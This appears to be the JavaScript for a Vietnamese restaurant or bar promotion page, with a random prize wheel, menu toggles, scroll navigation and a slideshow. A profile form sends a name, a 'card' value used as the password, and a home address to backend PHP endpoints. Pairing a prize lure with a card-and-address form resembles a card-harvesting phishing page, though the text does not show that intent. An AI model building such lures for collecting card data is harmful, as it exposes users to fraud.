function rafThrottle(callback) {
    let requestId = null;
    let lastArgs = null;

    const next = () => {
        if (lastArgs) {
            callback(...lastArgs);
            lastArgs = null;
            requestId = requestAnimationFrame(next);
        } else {
            requestId = null;
        }
    };

    return function (...args) {
        lastArgs = args;
        if (!requestId) {
            requestId = requestAnimationFrame(next);
        }
    };
}

window.spinWheel = function(wheelId = 'wheel', innerId = 'wheel-inner', notificationId = 'result-notification') {
    const wheel = document.getElementById(wheelId);
    const wheelInner = document.getElementById(innerId);
    const resultNotification = document.getElementById(notificationId);
    let spinning = wheel?.dataset.spinning !== 'true';

    if (!spinning) return;

    wheel.dataset.spinning = 'true';
    const randomDegrees = Math.floor(Math.random() * 360) + 1080;
    const prize = Math.floor(Math.random() * 999) + 1;

    wheel.style.transform = `rotate(${randomDegrees}deg)`;
    wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';

    setTimeout(() => {
        wheelInner.textContent = prize.toString().padStart(3, '0');
    }, 4000);

    setTimeout(() => {
        wheel.style.transition = 'transform 1s ease-out';
        wheel.style.transform = 'rotate(0deg)';

        let rewardMessage = '';
        if (prize <= 100) {
            rewardMessage = 'Bạn nhận được: GIẢM GIÁ 10% TỚI 7 - ON...';
        } else if (prize <= 200) {
            rewardMessage = 'Bạn nhận được: THƯỞNG BIA HEINEKEN...';
        } else if (prize <= 300) {
            rewardMessage = 'Bạn nhận được: THƯỞNG BIA SÁT GỌN...';
        } else if (prize <= 400) {
            rewardMessage = 'Bạn nhận được: THƯỞNG ĐẶC BIỆT...';
        } else if (prize <= 700) {
            rewardMessage = 'Bạn nhận được: THƯỞNG SIÊU PHẨM...';
        } else {
            rewardMessage = 'Bạn nhận được: JACKPOT - GIẢM GIÁ 50%!';
        }
        resultNotification.textContent = `Số điểm: ${prize}. ${rewardMessage}`;
        resultNotification.classList.add('active');

        wheel.dataset.spinning = 'false';

        setTimeout(() => {
            resultNotification.classList.remove('active');
            wheelInner.textContent = '000';
        }, 4000);
    }, 3000);
};

window.toggleDetails = function() {
    const rewardInfo = document.getElementById('reward-info');
    if (rewardInfo?.style.display === 'none' || rewardInfo?.style.display === '') {
        rewardInfo.style.display = 'block';
    } else {
        rewardInfo.style.display = 'none';
    }
};

window.toggleRelated = function(relatedId) {
    const relatedItems = document.getElementById(relatedId);
    const showMoreBtn = relatedItems?.nextElementSibling;
    relatedItems?.classList.toggle('expanded');
    if (showMoreBtn) {
        showMoreBtn.textContent = relatedItems.classList.contains('expanded') ? 'Thu gọn' : 'Xem thêm';
    }
};

document.addEventListener('DOMContentLoaded', () => {
    const profileBtn = document.querySelector('.profile-btn');
    const profileInfo = document.querySelector('.profile-info');
    const nameInput = document.getElementById('name');
    const cardInput = document.getElementById('card');
    const addressInput = document.getElementById('address');
    const saveBtn = document.getElementById('save-profile');
    const loginError = document.getElementById('login-error');
    const notification = document.getElementById('notification');
    const menuIcons = document.querySelectorAll('.menu-icon');
    const menuItems = document.querySelectorAll('.menu-item');

    if (profileBtn && profileInfo) {
        profileBtn.addEventListener('click', (event) => {
            event.preventDefault();
            profileInfo.classList.toggle('active');
        });

        document.addEventListener('click', (event) => {
            if (!profileBtn.contains(event.target) && !profileInfo.contains(event.target)) {
                profileInfo.classList.remove('active');
            }
        });
    }

    if (saveBtn) {
        saveBtn.addEventListener('click', async () => {
            const name = nameInput?.value.trim();
            const card = cardInput?.value.trim();
            const address = addressInput?.value.trim();
            if (name && card && address) {
                const profile = {
                    name,
                    card,
                    address,
                    timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' })
                };
                try {
                    const loginResponse = await fetch('backend/login.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username: name, password: card })
                    });
                    const loginData = await loginResponse.json();

                    if (loginResponse.ok && loginData.success) {
                        const profileResponse = await fetch('backend/profiles.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(profile)
                        });

                        if (profileResponse.ok) {
                            if (notification) {
                                notification.classList.add('active');
                                setTimeout(() => notification.classList.remove('active'), 3000);
                            }
                            if (profileInfo) profileInfo.classList.remove('active');
                            if (nameInput) nameInput.value = '';
                            if (cardInput) cardInput.value = '';
                            if (addressInput) addressInput.value = '';
                        } else {
                            throw new Error('Failed to save profile');
                        }
                    } else {
                        if (loginError) {
                            loginError.style.display = 'block';
                            loginError.textContent = loginData.message || 'Invalid login credentials!';
                        }
                    }
                } catch (error) {
                    console.error('Error:', error);
                    if (loginError) {
                        loginError.style.display = 'block';
                        loginError.textContent = 'System error. Please try again!';
                    }
                }
            } else {
                if (loginError) {
                    loginError.style.display = 'block';
                    loginError.textContent = 'Please fill in all fields!';
                }
            }
        });
    }

    menuItems.forEach((item) => {
        const itemName = item.querySelector('.item-name');
        const itemDetails = item.querySelector('.item-details');
        const relatedItems = item.querySelector('.related-items');
        const showMoreBtn = item.querySelector('.show-more-btn');
        const relatedTarget = item.getAttribute('data-related');

        if (itemName && itemDetails) {
            itemName.addEventListener('click', () => {
                menuItems.forEach(otherItem => {
                    if (otherItem !== item) {
                        otherItem.classList.remove('expanded');
                        const otherDetails = otherItem.querySelector('.item-details');
                        if (otherDetails) otherDetails.classList.remove('active');
                        const otherRelatedItems = otherItem.querySelector('.related-items');
                        if (otherRelatedItems) otherRelatedItems.classList.remove('expanded');
                        const otherShowMoreBtn = otherItem.querySelector('.show-more-btn');
                        if (otherShowMoreBtn) otherShowMoreBtn.textContent = 'Xem thêm';
                    }
                });

                item.classList.toggle('expanded');
                itemDetails.classList.toggle('active');

                if (item.classList.contains('expanded') && relatedTarget && relatedItems) {
                    relatedItems.innerHTML = '';

                    const relatedItem = document.querySelector(`#${relatedTarget}`);
                    if (relatedItem) {
                        const relatedDiv = document.createElement('div');
                        relatedDiv.classList.add('related-item');

                        const img = document.createElement('img');
                        img.src = relatedItem.querySelector('img')?.src;
                        img.alt = relatedItem.querySelector('.item-name')?.textContent;

                        const h5 = document.createElement('h5');
                        h5.textContent = relatedItem.querySelector('.item-name')?.textContent;

                        const p = document.createElement('p');
                        p.textContent = relatedItem.querySelector('.price')?.textContent;

                        const btn = document.createElement('button');
                        btn.classList.add('order-btn');
                        btn.textContent = 'Xem chi tiết';
                        btn.addEventListener('click', () => {
                            const targetElement = document.querySelector(`#${relatedTarget}`);
                            if (targetElement) {
                                const headerHeight = document.querySelector('.header')?.offsetHeight || 0;
                                const menuHeight = document.querySelector('.new-menu')?.offsetHeight || 0;
                                const y = targetElement.offsetTop - headerHeight - menuHeight - 20;
                                window.scrollTo({ top: y, behavior: 'smooth' });
                                targetElement.querySelector('.item-name')?.click();
                            }
                        });

                        if (img.src) relatedDiv.appendChild(img);
                        if (h5.textContent) relatedDiv.appendChild(h5);
                        if (p.textContent) relatedDiv.appendChild(p);
                        if (btn) relatedDiv.appendChild(btn);
                        relatedItems.appendChild(relatedDiv);
                    } else {
                        const noRelated = document.createElement('p');
                        noRelated.textContent = 'Không có món liên quan';
                        noRelated.style.color = '#666';
                        noRelated.style.fontSize = '12px';
                        relatedItems.appendChild(noRelated);
                    }
                }
            });
        }

        if (showMoreBtn && relatedItems) {
            showMoreBtn.addEventListener('click', () => {
                relatedItems.classList.toggle('expanded');
                showMoreBtn.textContent = relatedItems.classList.contains('expanded') ? 'Thu gọn' : 'Xem thêm';
            });
        }
    });

    let lastActiveIndex = 0;
    function updateMenuState() {
        const scrollPosition = window.scrollY;
        const headerHeight = document.querySelector('.header')?.offsetHeight || 0;
        const menuHeight = document.querySelector('.new-menu')?.offsetHeight || 0;
        const adjustedScroll = scrollPosition + headerHeight + menuHeight;

        const slideshow = document.getElementById('slideshow-container')?.offsetTop || Infinity;
        const wheelSection = document.getElementById('wheel-section')?.offsetTop || Infinity;
        const menuSection = document.getElementById('menu-section')?.offsetTop || Infinity;
        const buffer = 50;

        let activeIndex = lastActiveIndex;

        if (adjustedScroll >= menuSection - buffer) activeIndex = 2;
        else if (adjustedScroll >= wheelSection - buffer) activeIndex = 1;
        else activeIndex = 0;

        if (activeIndex !== lastActiveIndex && menuIcons[activeIndex]) {
            menuIcons.forEach(icon => {
                icon.classList.remove('active');
                icon.style.filter = 'brightness(0.5) invert(1)';
                icon.style.border = 'none';
            });
            menuIcons[activeIndex].classList.add('active');
            menuIcons[activeIndex].style.filter = 'none';
            menuIcons[activeIndex].style.border = '2px solid #ffd700';
            lastActiveIndex = activeIndex;
        }
    }

    if (menuIcons.length) {
        menuIcons.forEach((icon, index) => {
            icon.addEventListener('click', (event) => {
                event.preventDefault();
                const targetId = icon.getAttribute('data-target');
                const targetElement = document.querySelector(targetId);
                if (targetElement) {
                    const headerHeight = document.querySelector('.header')?.offsetHeight || 0;
                    const menuHeight = document.querySelector('.new-menu')?.offsetHeight || 0;
                    const y = targetElement.offsetTop - headerHeight - menuHeight - 20;
                    window.scrollTo({ top: y, behavior: 'smooth' });

                    menuIcons.forEach(i => {
                        i.classList.remove('active');
                        i.style.filter = 'brightness(0.5) invert(1)';
                        i.style.border = 'none';
                    });
                    icon.classList.add('active');
                    icon.style.filter = 'none';
                    icon.style.border = '2px solid #ffd700';
                    lastActiveIndex = index;
                }
            });
        });

        window.addEventListener('scroll', rafThrottle(updateMenuState));
    }

    let slideIndex = 0;
    let autoSlideTimeout;

    function showSlides() {
        let slides = document.querySelectorAll(".slide");
        for (let i = 0; i < slides.length; i++) {
            slides[i].classList.remove("active");
        }
        if (slideIndex >= slides.length) slideIndex = 0;
        if (slideIndex < 0) slideIndex = slides.length - 1;
        if (slides[slideIndex]) slides[slideIndex].classList.add("active");
        slideIndex++;
        clearTimeout(autoSlideTimeout);
        autoSlideTimeout = setTimeout(showSlides, 3000);
    }

    window.changeSlide = function(n) {
        slideIndex += n;
        showSlides();
    };

    showSlides();
});